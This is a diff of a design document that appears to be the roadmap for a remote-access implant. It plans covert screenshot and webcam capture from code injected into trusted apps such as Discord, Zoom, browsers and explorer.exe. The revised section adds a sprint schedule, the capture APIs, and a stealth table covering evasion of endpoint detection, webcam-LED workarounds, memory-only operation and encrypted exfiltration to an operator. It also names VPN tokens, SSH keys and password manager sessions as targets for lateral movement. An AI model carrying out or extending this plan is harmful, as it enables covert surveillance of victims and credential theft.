@@ -197,31 +197,49 @@ Analogous to macOS `EntitlementScanner.cpp`. Enumerates running processes and re
 
 ---
 
-### 4D — Media Capture (Camera + Screenshots) *(Deferred after reflective loader)*
+### 4D — Media Capture (Camera + Screenshots) *(Active — Phase 1: Windows Screenshot)*
 
 *Target: New media capture module, injected agent*
 
 **Rationale**: Camera and desktop screenshots require the most sensitive OS permissions (Camera / Screen Recording TCC on macOS, Win32 screen capture APIs on Windows). Attempting them from a standalone binary will immediately trigger permission prompts or EDR alerts. By running inside an injected process (4A/4B) that *already has* these permissions (Discord, Zoom, Slack, browsers), we inherit trust silently.
 
-| Platform | Capability | Approach | Permission Inherited From |
+#### Delivery Plan (4 sprints)
+
+| Sprint | Scope | Output |
+|--------|-------|--------|
+| **Week 1** | Windows Screenshot | `ScreenCapture` module (`IDXGIOutputDuplication` + `BitBlt` fallback), JPEG via GDI+, chunked+encrypted transmission, server-side "Capture" button |
+| **Week 2** | Windows Camera | `CameraCapture` module (`IMFMediaSource`, single-frame grab), graceful skip on consent prompt, unified opcode schema |
+| **Week 3–4** | macOS TCC Scanner + Screenshot | Extend `EntitlementScanner` to query TCC database for Camera/Screen Recording grants; `CGImage` screenshot capture; macOS `ScreenCapture` stub with graceful denial |
+| **Deferred** | macOS Camera, Linux | macOS camera requires Tier 2 injection into a TCC-authorized app; Linux needs Wayland `xdg-desktop-portal` and `v4l2` — no timeline |
+
+#### Platform Matrix
+
+| Platform | Capability | Approach | Permission Requirement |
 |---|---|---|---|
-| macOS | Screenshot | `CGDisplayStream` / `CGImage` via injected dylib | Zoom, Discord, Slack (user already granted Screen Recording) |
-| macOS | Camera | `AVCaptureSession` via injected dylib | FaceTime, Zoom, Chrome (user already granted Camera) |
-| Windows | Screenshot | `BitBlt` / `IDXGIOutputDuplication` inside injected process | `explorer.exe`, browser (no additional prompt — runs in user session) |
-| Windows | Camera | `IMFMediaSource` (MediaFoundation) inside injected process | Browser or Skype process (already has camera permission) |
-| Linux | Screenshot | X11 `XGetImage` or Wayland `xdg-desktop-portal` | Desktop environment session |
-| Linux | Camera | Video4Linux2 `/dev/video*` via injected process | Inherits process group permissions |
+| Windows | Screenshot | `IDXGIOutputDuplication` / `BitBlt` + GDI+ JPEG | None (runs in user session) |
+| Windows | Camera | `IMFMediaSource` (MediaFoundation) | Inherited from host process (browser, Skype) — fail gracefully if not available |
+| macOS | Screenshot | `CGImage` via injected dylib | TCC Screen Recording grant (query via `tccutil` DB scanner) |
+| macOS | Camera | `AVCaptureSession` | TCC Camera grant (query via `tccutil` DB scanner) |
+| Linux | Screenshot | X11 `XGetImage` / Wayland `xdg-desktop-portal` | Desktop session |
+| Linux | Camera | Video4Linux2 `/dev/video*` | Inherited process permissions |
 
-**Evasion considerations**:
-- **Webcam LED**: On most laptops the camera LED is hardwired to the power rail — cannot be disabled in software. Mitigation: capture only when the user is already on a video call (the LED is already on), or use infrared camera on devices that have one (LED may not activate).
-- **Screen capture EDR hooks**: Windows EDRs monitor `BitBlt`/`IDXGIOutputDuplication` calls from non-GUI processes. Injection into `explorer.exe` or the browser process blends in with legitimate UI rendering.
-- **Exfiltration size**: Raw screenshots are large (several MB). Must be compressed (`libjpeg-turbo`, `libwebp`) before transport. Phase 5 transport upgrades (HTTP/2 beaconing, chunked transfer) are required to avoid suspicion.
-- **Capture scheduling**: Use low-frequency opportunistic capture (e.g., screenshot only when mouse/keyboard activity is detected) rather than continuous streaming — reduces data volume and detection surface.
+#### Stealth & Evasion
 
-**Dependencies**:
-- Requires Phase 4A/4B injection (for permission inheritance)
-- Should be ordered *before* Phase 7 (evasive propagation) — screenshots of a compromised host's desktop can capture VPN tokens, password manager sessions, and SSH keys that enable lateral movement
-- Phase 5 transport evasion should be implemented *concurrently or just after* — raw image data cannot be sent over current unencrypted/chunked protocol without raising alarms
+| Concern | Mitigation |
+|---------|-----------|
+| **Bandwidth / size** | JPEG quality 85 (200–500KB per 1080p frame); chunked + jittered over persistent TCP socket |
+| **Webcam LED** | Single-frame capture (not streaming); only attempt when host process likely has camera (browser, chat app) |
+| **Screen capture EDR hooks** | Runs inside injected process — `explorer.exe` or browser; `IDXGIOutputDuplication` is a legitimate D3D call used by screen-sharing apps |
+| **Traffic fingerprint** | Same AES-256-GCM encryption + same TCP socket as all other agent traffic; no dedicated connection for media |
+| **Timing analysis** | On-demand only (operator clicks "Capture"); no polling loop; `GetLastInputInfo()` gate to skip when user is idle |
+| **Disk artifacts** | Entire pipeline is memory-only: GPU → RAM → JPEG encode → encrypt → send; never touches disk |
+| **Capture resolution** | Default 1280×720 (not native); grayscale option for 30–50% size reduction |
+
+#### Dependencies
+
+- Requires reflective injection (Phase 4B.5-#4 / Follow-up #2) — media capture runs inside the injected process
+- Screenshots feed Phase 7 (evasive propagation) — desktop captures yield VPN tokens, SSH keys, password manager sessions
+- Phase 5 transport upgrades (HTTP/2, mTLS) are concurrent but not blocking — current AES-256-GCM + chunked TCP is sufficient for JPEG transfer
 
 ---
 
